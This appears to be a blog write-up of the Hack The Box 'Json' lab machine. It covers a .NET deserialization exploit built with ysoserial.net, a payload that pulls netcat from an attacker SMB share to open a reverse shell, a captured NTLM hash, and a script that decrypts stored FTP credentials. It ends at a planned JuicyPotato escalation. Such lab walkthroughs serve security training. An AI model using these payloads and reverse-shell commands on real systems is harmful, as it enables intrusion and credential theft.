+++
date = '2025-03-13T13:19:43-04:00'
draft = false
title = 'HtB Json'
tags = ['writeup','hackthebox','medium','windows']
hideToc = false
+++
![HtB-JSON](/images/Json.png)

JSON is a medium difficulty Windows machine running an IIS server with an ASP.NET application. The application is found to be vulnerable to .NET deserialization, which is exploited using ysoserial.net. A custom .NET program is found to be installed, which on reverse engineering reveals encrypted credentials for an administrator. These credentials can be decrypted and used to gain access to the FTP folder.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~]
└─$ nmap -T4 -p- -A 10.129.227.191           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 22:41 EST
Nmap scan report for 10.129.227.191
Host is up (0.025s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Json HTB
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2012
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
OS details: Microsoft Windows Server 2012 or 2012 R2
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:97:08 (VMware)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-07T03:42:48
|_  start_date: 2025-03-07T03:39:49
```

### HTTP - 80/tcp

![json1](/images/json1.png)

Tried a few simple guesses for the login, and found success with `admin:admin`

![json2](/images/json2.png)

## Initial Access

### Deserialization

Looking at the request in BurpSuite, it seems we get a cookie with the value `OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=` after logging in.  There's also a `Bearer` header with the same value. Finally, I notice a GET request to `/api/Account` that returns the base64 decoded value of that cookie.

```json
{
	"Id":1,
	"UserName":"admin",
	"Password":"21232f297a57a5a743894a0e4a801fc3",
	"Name":"User Admin HTB",
	"Rol":"Administrator"
}
```

Changing the value of the cookie, then replacing the cookie value + `Bearer` header, we finally throw an error. Seems like we might be able to attack this site with a deserialization attack.

```json
{"Id":',"UserName":"'","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
```

![json3](/images/json3.png)

Looks like we can use the .NET equivalent of `ysoserial` called `ysoserial.NET` ([GitHub](https://github.com/pwntester/ysoserial.net))

I looked for any gadget that supported the Json.Net formatter, and finally found one that worked. Here's the command I ran in `ysoserial.exe`

```powershell
C:\Users\pL4sTiC\Desktop\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping 10.10.14.10" -o base64
```

And observing in Wireshark, I did indeed have a few ICMP packets originating from the target machine... we can run code!

Let's host an SMB share so we can get netcat on the target machine, then catch a reverse shell.

```PowerShell
C:\Users\pL4sTiC\Desktop\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "net use \\10.10.14.10\share & \\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 4444" -o base64
```

Paste the base64 payload in the `Bearer` header and send the GET request.  We'll see the successful SMB connection, followed by the reverse shell.

```sh
┌──(pl4stic㉿kali)-[~/htb/json]
└─$ sudo impacket-smbserver share .
[sudo] password for pl4stic: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.227.191,50469)
[*] AUTHENTICATE_MESSAGE (JSON\userpool,JSON)
[*] User JSON\userpool authenticated successfully
[*] userpool::JSON:aaaaaaaaaaaaaaaa:cc1b12cb8551688e0727f2e534b487ad:010100000000000080036c242792db01a7f361e43461745c000000000100100049006d00660048006400590047004d000300100049006d00660048006400590047004d00020010004400440076004e005600640049005000040010004400440076004e0056006400490050000700080080036c242792db01060004000200000008003000300000000000000000000000003000001af08ed076cdd3c1d3530a26043cea7101097a2906cc4a356d68c50b56159fc90a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310039003900000000000000000000000000
```

```sh
┌──(pl4stic㉿kali)-[~/htb/json]
└─$ nc -nvlp 4444                    
listening on [any] 4444 ...
connect to [10.10.14.199] from (UNKNOWN) [10.129.227.191] 50473
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
json\userpool

c:\windows\system32\inetsrv>
```

Sadly, I wasn't able to crack `userpool`'s hash using rockyou.txt.  Regardless, grab `user.txt` and let's move on.

## Privilege Escalation

### Enumeration

Looks like we can impersonate privileges, so *maybe* a Potato attack?

```PowerShell
C:\Users\userpool\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

And a couple of interesting files in the `C:\inetpub\wwwroot\` directory:

```PowerShell
C:\inetpub\wwwroot\jsonapp\dbdata>type "userscredentials - Copy.json"
type "userscredentials - Copy.json"

   [
    {
      "Id": 1,
      "UserName": "puppet",
      "Password": "0571749e2ac330a7455809c6b0e7af90",
      "Name": "User Admin HTB",
      "Rol": "Administrator"
    },
    {
      "Id": 1,
      "UserName": "ansible",
      "Password": "84d961568a65073a3bcf0eb216b2a576",
      "Name": "User",
      "Rol": "User"
    }
  ]
```

```PowerShell
C:\inetpub\wwwroot\jsonapp>type Web.config
type Web.config
<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301879
  -->
<configuration>
  <appSettings>
    <add key="IV" value="uLdDJr^B9bkbf0PdJGHA2UMHEGz"/>
  </appSettings>
[...snip...]
```

Checking the installed programs, there seems to be the usual culprits except for one interesting one: `Sync2Ftp`

```PowerShell
C:\Program Files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of C:\Program Files

08/08/2019  07:04 PM    <DIR>          .
08/08/2019  07:04 PM    <DIR>          ..
08/08/2019  07:04 PM    <DIR>          Common Files
11/21/2014  07:24 AM    <DIR>          Embedded Lockdown Manager
08/08/2019  07:04 PM    <DIR>          Internet Explorer
05/22/2019  04:37 PM    <DIR>          MSBuild
05/22/2019  04:37 PM    <DIR>          Reference Assemblies
05/23/2019  03:06 PM    <DIR>          Sync2Ftp
05/22/2019  04:28 PM    <DIR>          VMware
08/08/2019  07:04 PM    <DIR>          Windows Mail
08/08/2019  07:04 PM    <DIR>          Windows Media Player
08/08/2019  07:04 PM    <DIR>          Windows Multimedia Platform
08/08/2019  07:04 PM    <DIR>          Windows NT
08/08/2019  07:04 PM    <DIR>          Windows Photo Viewer
08/08/2019  07:04 PM    <DIR>          Windows Portable Devices
11/21/2014  07:24 AM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              16 Dir(s)   4,619,567,104 bytes free
```

### Sync2Ftp

Doing some research on `Sync2Ftp`, it seems it helps sync local files with an FTP server when they're modified, created, and deleted. Interesting... especially since we saw an FTP server we couldn't access during our initial enumeration.

There's also an interesting file in the directory for the application.

```PowerShell
C:\Program Files\Sync2Ftp>type SyncLocation.exe.config
type SyncLocation.exe.config
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <appSettings>
    <add key="destinationFolder" value="ftp://localhost/"/>
    <add key="sourcefolder" value="C:\inetpub\wwwroot\jsonapp\Files"/>
    <add key="user" value="4as8gqENn26uTs9srvQLyg=="/>
    <add key="minute" value="30"/>
    <add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="></add>
    <add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/>
  </appSettings>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>


</configuration>
```

Let's pull the binary to our Windows VM and take a look at it as well in ILSpy.

![json4](/images/json4.png)

And let's take what we know and write our own decryption function in Python.

```Python
#!/usr/bin/env python3

import base64
import hashlib
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad

user_enc = "4as8gqENn26uTs9srvQLyg=="
pass_enc = "oQ5iORgUrswNRsJKH9VaCw=="
key_str = b"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"

def decrypt(s):
	ciphertext = base64.b64decode(s)
	key = hashlib.md5(key_str).digest()
	des = DES3.new(key, DES3.MODE_ECB)
	return unpad(des.decrypt(ciphertext), 8).decode()
	
print(f'[+] Username: {decrypt(user_enc)}')
print(f'[+] Password: {decrypt(pass_enc)}')
```

```sh
┌──(pl4stic㉿kali)-[~/htb/json]
└─$ python3 decrypt_pass.py

[+] Username: superadmin
[+] Password: funnyhtb
```

### FTP Access

With our new `superadmin` credentials, we can now access the administrator's user folder, and subsequently `root.txt`.

```sh
┌──(pl4stic㉿kali)-[~/htb/json]
└─$ ftp json.htb               
Connected to json.htb.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (json.htb:pl4stic): superadmin
331 Password required for superadmin
Password: 
230 Logged on
```

## JuicyPotato

As we suspected before, our privileges and the state of system patches leaves this box susceptible to the Juicy Potato attack. [Download Here](https://github.com/ohpe/juicy-potato/releases)

```PowerShell
C:\Program Files\Sync2Ftp>systeminfo
systeminfo

Host Name:                 JSON
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-80005-00001-AA602
Original Install Date:     5/22/2019, 4:27:16 PM
System Boot Time:          3/10/2025, 4:16:01 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              es-mx;Spanish (Mexico)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     8,191 MB
Available Physical Memory: 7,589 MB
Virtual Memory: Max Size:  9,471 MB
Virtual Memory: Available: 8,890 MB
Virtual Memory: In Use:    581 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.227.191
                                 [02]: fe80::f197:64a1:fdd:5454
                                 [03]: dead:beef::f197:64a1:fdd:5454
                                 [04]: dead:beef::199
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```